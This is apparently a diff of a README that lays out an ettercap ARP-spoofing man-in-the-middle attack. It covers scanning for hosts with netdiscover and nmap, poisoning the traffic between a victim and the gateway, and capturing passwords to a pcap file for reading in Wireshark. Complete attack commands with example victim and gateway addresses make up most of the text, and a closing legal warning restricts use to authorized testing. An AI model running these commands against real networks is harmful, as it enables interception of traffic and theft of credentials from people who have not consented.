@@ -27,11 +27,15 @@ sudo apt install ettercap-text-only netdiscover nmap
 ip a
 ```
 Example interface: eth0, wlan0, etc.
+
+---
 ##🔍 Step 2: Scan for Hosts
 ###Option 1: Netdiscover
 ```bash
 sudo netdiscover -i eth0
 ```
+
+---
 ###Option 2: Nmap
 ```bash
 sudo nmap -sn 192.168.0.0/24
@@ -48,11 +52,12 @@ Your interface → INTERFACE
 ```bash
 sudo ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
 ```
+
 ##Example:
 ```bash
 sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
 ```
-
+---
 ## :Flags Explained:
 
 -T: Text (CLI) mode
@@ -62,6 +67,8 @@ sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
 /target1/ /target2/: Victim and Gateway IPs
 
 -i: Interface to use
+
+---
 ##🔐 Step 4: Capture Passwords (Optional)
 ```bash
 sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
@@ -71,6 +78,8 @@ sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP/ /GATEWAY_IP/ -i INTE
 ```bash
 wireshark mitm_log.pcap
 ```
+
+---
 ##🔚 Step 5: Stop the Attack
 To quit Ettercap, press q.
 
@@ -78,12 +87,14 @@ To restore ARP tables manually:
 ```bash
 sudo ettercap -T -P restore_arp -i INTERFACE
 ```
+---
 
 ##⚠️ Legal Warning
 This guide is provided for educational and authorized penetration testing only.
 Unauthorized access to networks or data is illegal and punishable by law.
 Always get written permission before testing any network.
 
+---
 
 ##📌 Author
 
